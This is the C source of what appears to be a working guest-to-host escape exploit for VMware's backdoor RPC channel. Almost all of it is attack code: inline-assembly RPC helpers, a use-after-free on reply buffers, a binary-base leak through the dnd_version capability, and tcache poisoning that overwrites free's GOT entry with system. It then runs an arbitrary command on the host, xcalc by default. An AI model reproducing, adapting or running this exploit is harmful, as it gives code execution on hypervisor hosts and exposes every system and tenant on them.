// gcc exploit.c -masm=intel -DDEBUG -o exploit

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

struct channel {
	char number;
	uint32_t cookie[2];
};

struct reply {
	uint32_t length;
	uint32_t type;
	char *buffer;
};

static int run_rpc(char *cmd);

static int send_command(struct channel ch, char *cmd);
static int recv_reply(struct channel ch, struct reply *prep);
static int finish_reply(struct channel ch, struct reply *prep, char flag);

static void dump(const void *buf, unsigned long size);

static int rpc_open_channel(struct channel *pch);
static int rpc_send_cmd_length(const struct channel ch, const uint32_t length);
static int rpc_send_cmd(const struct channel ch, const uint32_t length, const char *buf);
static int rpc_recv_reply_length(const struct channel ch, struct reply *prep);
static int rpc_recv_reply(const struct channel ch, struct reply rep);
static int rpc_finish_reply(const struct channel ch, const struct reply rep, const char flag);
static int rpc_close_channel(const struct channel ch);

uint64_t leak_base(void);
void exploit(uint64_t addr_bin_base, char *cmd);

int main(int argc, char *argv[]){
	char buf[0x200] = {};
	uint64_t addr_bin_base;

	setbuf(stdout, NULL);
	setbuf(stderr, NULL);

	printf("[+] set guestinfo.hoge\n");
	strncpy(buf, "info-set guestinfo.hoge ", sizeof(buf)-1);
	memset(buf+strlen(buf), 'A', 0x100-2);
	run_rpc(buf);

	printf("[+] set guestinfo.fuga\n");
	strncpy(buf, "info-set guestinfo.fuga ", sizeof(buf)-1);
	memset(buf+strlen(buf), 'B', 0x100-2);
	run_rpc(buf);

	if(!(addr_bin_base = leak_base()))
		goto end;
	printf("[*] addr_bin_base = 0x%08lx\n", addr_bin_base);

	exploit(addr_bin_base, argc > 1 ? argv[1] : "DISPLAY=:0 xcalc");

end:
	return 0;
}

uint64_t leak_base(void){
	struct channel ch[2] = {};
	struct reply rep[2] = {};
	uint64_t leak_addr = 0;

	for(int i = 0; i < sizeof(ch)/sizeof(struct channel); i++){
		if(!rpc_open_channel(&ch[i])){
			fprintf(stderr, "FAIL: open_channel\n");
			exit(-1);
		}
	}

	if(send_command(ch[0], "info-get guestinfo.hoge") < 0 || recv_reply(ch[0], &rep[0]) < 0)
		goto end;

	// free ch0.rep buffer
	if(finish_reply(ch[0], &rep[0], 0x20) < 0)
		goto end;

	// malloc ch1.rep (= ch0.rep)
	if(send_command(ch[1], "info-get guestinfo.fuga") < 0)
		goto end;
	rpc_recv_reply_length(ch[1], &rep[1]);
	rep[1].buffer = calloc(rep[1].length+4, 1);

	// free ch0.rep buffer (UAF)
	printf("[+] trigger UAF in channel %d (free the channel %d output buffer)\n", ch[0].number, ch[1].number);
	rpc_recv_reply_length(ch[0], &rep[0]);
	if(finish_reply(ch[0], &rep[0], 0x20) < 0)
		goto end;

	printf("[+] reuse buffer and leaking binary base\n");
	run_rpc("vmx.capability.dnd_version");

	// leak
	rpc_recv_reply(ch[1], rep[1]);
	leak_addr = ((uint64_t*)rep[1].buffer)[0] - 0xf818d0;

	if(finish_reply(ch[1], &rep[1], 0) < 0)
		goto end;

end:
	for(int i = 0; i < sizeof(ch)/sizeof(struct channel); i++){
		if(!rpc_close_channel(ch[i])){
			fprintf(stderr, "FAIL (channel %d): close_channel\n", ch[i].number);
			exit(-1);
		}
	}

	return leak_addr;
}

void exploit(uint64_t addr_bin_base, char *cmd){
	struct channel ch[5] = {};
	struct reply rep[2] = {};
	uint64_t addr_plt_system	= addr_bin_base + 0x0ecfd0;
	uint64_t addr_got_free		= addr_bin_base + 0xfa6978;

	for(int i = 0; i < sizeof(ch)/sizeof(struct channel); i++){
		if(!rpc_open_channel(&ch[i])){
			fprintf(stderr, "FAIL: open_channel\n");
			exit(-1);
		}
	}

	if(send_command(ch[0], "info-get guestinfo.hoge") < 0 || recv_reply(ch[0], &rep[0]) < 0)
		goto end;
	if(send_command(ch[1], "info-get guestinfo.fuga") < 0 || recv_reply(ch[1], &rep[1]) < 0)
		goto end;

	// free ch0.rep buffer
	if(finish_reply(ch[0], &rep[0], 0x20) < 0)
		goto end;

	// malloc ch2.cmd (= ch0.rep)
	rpc_send_cmd_length(ch[2], 0x100);

	// free ch0.rep buffer
	printf("[+] trigger UAF in channel %d (free the channel %d command buffer)\n", ch[0].number, ch[2].number);
	rpc_recv_reply_length(ch[0], &rep[0]);
	if(finish_reply(ch[0], &rep[0], 0x20) < 0)
		goto end;

	// overwrite tcache fd
	printf("[+] overwriting tcache fd (size : 0x110) <- addr_got_free (0x%08lx)\n", addr_got_free);
	rpc_send_cmd(ch[2], 0x8, (char*)&addr_got_free);

	// malloc ch3.cmd (= ch0.rep)
	rpc_send_cmd_length(ch[3], 0x100);
	// malloc ch4.cmd (= got_free)
	printf("[+] malloc from got_free\n");
	rpc_send_cmd_length(ch[4], 0x100);

	// free ch1.rep buffer
	if(finish_reply(ch[1], &rep[1], 0x20) < 0)
		goto end;

	// set ch3.cmd 
	rpc_send_cmd(ch[3], strlen(cmd)+1, cmd);

	// overwrite got_free <- plt_system
	printf("[+] overwriting got_free (0x%08lx) <- addr_plt_system (0x%08lx)\n", addr_got_free, addr_plt_system);
	rpc_send_cmd(ch[4], 0x8, (char*)&addr_plt_system);

	// free ch0.rep (= ch3.cmd) buffer
	printf("[+] trigger free to call system(\"%s\")\n", cmd);
	fflush(stdout);
end:
	for(int i = 0; i < sizeof(ch)/sizeof(struct channel); i++){
		if(!rpc_close_channel(ch[i])){
			fprintf(stderr, "FAIL (channel %d): close_channel\n", ch[i].number);
			exit(-1);
		}
	}
}

static int run_rpc(char *cmd){
	struct channel ch = {};
	struct reply rep = {};

	if(!rpc_open_channel(&ch)){
		fprintf(stderr, "FAIL: open_channel\n");
		return -1;
	}

	if(send_command(ch, cmd) < 0 || recv_reply(ch, &rep) < 0)
		return -1;
	finish_reply(ch, &rep, 0);

	if(!rpc_close_channel(ch)){
		fprintf(stderr, "FAIL (channel %d): close_channel\n", ch.number);
		return -1;
	}

	return 0;
}

static int send_command(struct channel ch, char *cmd){
	int size;
   
	if(!cmd)
		return -1;
	size = strlen(cmd);

	if(!rpc_send_cmd_length(ch, size)){
		fprintf(stderr, "FAIL (channel %d): send_cmd_length\n", ch.number);
		return -1;
	}
	if(!rpc_send_cmd(ch, size, cmd)){
		fprintf(stderr, "FAIL (channel %d): send_cmd\n", ch.number);
		return -1;
	}

	return size;
}

static int recv_reply(struct channel ch, struct reply *prep){
	if(!rpc_recv_reply_length(ch, prep)){
		fprintf(stderr, "FAIL (channel %d): recv_reply_length\n", ch.number);
		return -1;
	}

	if(!(prep->buffer = calloc(prep->length+4, 1))){
		fprintf(stderr, "ERR : calloc(%d)\n", prep->length+1);
		return -1;
	}

	if(!rpc_recv_reply(ch, *prep)){
		fprintf(stderr, "FAIL (channel %d): recv_reply\n", ch.number);
		return -1;
	}

	return 0;
}

static int finish_reply(struct channel ch, struct reply *prep, char flag){
	if(!rpc_finish_reply(ch, *prep, flag)){
		fprintf(stderr, "FAIL (channel %d): finish_reply\n", ch.number);
		return -1;
	}

	free(prep->buffer);
	prep->buffer = NULL;

	return 0;
}

static void dump(const void *buf, unsigned long size){
	const unsigned long *p = buf;

	size = (size+7) & ~(8-1);
	printf("=== DUMP (%p-%p) ===\n", buf, buf+size);
	for(int i = 0; i < size/8; i++){
		printf("%016lx ", p[i]);
		if(i%4 == 3)
			printf("\n");
	}
	printf("\n");
}

static int rpc_open_channel(struct channel *pch){
	int ret;

	if(!pch)
		return 0;

	asm volatile (
		"mov eax, 0x564d5868\n"
		"mov ebx, 0xc9435052\n"
		"mov ecx, 0x1e\n"
		"mov edx, 0x5658\n"
		"out dx, eax\n"
		"shr edx, 0x10\n"
	: "=d"(pch->number), "=S"(pch->cookie[0]), "=D"(pch->cookie[1]), "=c"(ret)
	:
	: "rax", "rbx"
	);

#ifdef DEBUG
	printf("[OPEN]\tchannel %d\n", pch->number);
#endif

	return ret;
}

static int rpc_send_cmd_length(const struct channel ch, const uint32_t length){
	int ret;

#ifdef DEBUG
	printf("[SEND_LENGTH]\t(chan:%d) %d\n", ch.number, length);
#endif

	asm volatile (
		"mov eax, 0x564d5868\n"
		"mov ecx, 0x0001001e\n"
		"shl edx, 0x10\n"
		"add edx, 0x5658\n"
		"out dx, eax\n"
	: "=c"(ret)
	: "d"(ch.number), "S"(ch.cookie[0]), "D"(ch.cookie[1]), "b"(length)
	: "rax"
	);

	return ret;
}

#ifdef OLDMETHOD
static int rpc_send_cmd(const struct channel ch, const uint32_t length, const char *buf){
	int ret;
	uint32_t *p;

	if(!(p = (uint32_t *)buf))
		return 0;

#ifdef DEBUG
	printf("[SEND_CMD]\t(chan:%d) %s\n", ch.number, buf);
	dump(buf, length);
#endif

	for(int i = 0; i < (length+3)/4; i++){
		asm volatile (
			"mov eax, 0x564d5868\n"
			"mov ecx, 0x0002001e\n"
			"shl edx, 0x10\n"
			"add edx, 0x5658\n"
			"out dx, eax\n"
		: "=c"(ret)
		: "d"(ch.number), "S"(ch.cookie[0]), "D"(ch.cookie[1]), "b"(p[i])
		);
	}

	return ret;
}
#else
static int rpc_send_cmd(const struct channel ch, const uint32_t length, const char *buf){
	int ret;

	if(!buf)
		return 0;

#ifdef DEBUG
	printf("[*SEND_CMD]\t(chan:%d) %s\n", ch.number, buf);
	dump(buf, length);
#endif

	asm volatile (
		"push rbp\n"
		"mov ebp, eax\n"
		"mov eax, 0x564d5868\n"
		"mov ebx, 0x10000\n"
		"shl edx, 0x10\n"
		"add edx, 0x5659\n"
		"cld\n"
		"rep outs dx, byte ptr [rsi]\n"
		"pop rbp\n"
	: "=b"(ret)
	: "d"(ch.number), "a"(ch.cookie[0]), "D"(ch.cookie[1]), "S"(buf), "c"(length)
	);

	return ret;
}
#endif

static int rpc_recv_reply_length(const struct channel ch, struct reply *prep){
	int ret;

	if(!prep)
		return 0;

	asm volatile (
		"mov eax, 0x564d5868\n"
		"mov ecx, 0x0003001e\n"
		"shl edx, 0x10\n"
		"add edx, 0x5658\n"
		//"in eax, dx\n"
		"out dx, eax\n"
		"shr edx, 0x10\n"
	: "=c"(ret), "=b"(prep->length), "=d"(prep->type)
	: "d"(ch.number), "S"(ch.cookie[0]), "D"(ch.cookie[1])
	: "rax"
	);

#ifdef DEBUG
	printf("[RECV_LENGTH]\t(chan:%d) %d\n", ch.number, prep->length);
#endif

	return ret;
}

#ifdef OLDMETHOD
static int rpc_recv_reply(const struct channel ch, struct reply rep){
	int ret;
	uint32_t *p;

	if(!(p = (uint32_t *)rep.buffer))
		return 0;

	for(int i = 0; i < (rep.length+3)/4; i++){
		asm volatile (
			"mov eax, 0x564d5868\n"
			"mov ecx, 0x0004001e\n"
			"shl edx, 0x10\n"
			"add edx, 0x5658\n"
			"in eax, dx\n"
		: "=c"(ret), "=b"(p[i])
		: "d"(ch.number), "S"(ch.cookie[0]), "D"(ch.cookie[1]), "b"(rep.type)
		);
	}

#ifdef DEBUG
	printf("[RECV_REPLY]\t(chan:%d) %s\n", ch.number, rep.buffer);
	dump(rep.buffer, rep.length);
#endif

	return ret;
}
#else
static int rpc_recv_reply(const struct channel ch, struct reply rep){
	int ret;

	if(!rep.buffer)
		return 0;

	asm volatile (
		"push rbp\n"
		"push rdi\n"
		"push rdx\n"
		"mov ebp, eax\n"
		"mov eax, 0x564d5868\n"
		"mov ebx, 0x10000\n"
		"shl edx, 0x10\n"
		"add edx, 0x5659\n"
		"cld\n"
		"rep ins byte ptr [rdi], dx\n"
		"pop rdx\n"
		"pop rdi\n"
		"pop rbp\n"
	: "=b"(ret)
	: "d"(ch.number), "S"(ch.cookie[0]), "a"(ch.cookie[1]), "D"(rep.buffer), "c"(rep.length)
	);

#ifdef DEBUG
	printf("[*RECV_REPLY]\t(chan:%d) %s\n", ch.number, rep.buffer);
	dump(rep.buffer, rep.length);
#endif

	return ret;
}
#endif

static int rpc_finish_reply(const struct channel ch, const struct reply rep, const char flag){
	int ret;

#ifdef DEBUG
	printf("[FINISH_REPLY]\t(chan:%d) type:0x%02x\n", ch.number, rep.type | flag);
#endif

	asm volatile (
		"or ebx, eax\n"
		"mov eax, 0x564d5868\n"
		"mov ecx, 0x0005001e\n"
		"shl edx, 0x10\n"
		"add edx, 0x5658\n"
		"out dx, eax\n"
	: "=c"(ret)
	: "d"(ch.number), "S"(ch.cookie[0]), "D"(ch.cookie[1]), "b"(rep.type), "a"(flag)
	);

	return ret;
}

static int rpc_close_channel(const struct channel ch){
	int ret;

#ifdef DEBUG
	printf("[CLOSE]\tchannel %d\n", ch.number);
#endif

	asm volatile (
		"mov eax, 0x564d5868\n"
		"mov ecx, 0x0006001e\n"
		"shl edx, 0x10\n"
		"add edx, 0x5658\n"
		"out dx, eax\n"
	: "=c"(ret)
	: "d"(ch.number), "S"(ch.cookie[0]), "D"(ch.cookie[1])
	: "rax", "rbx"
	);

	return ret;
}
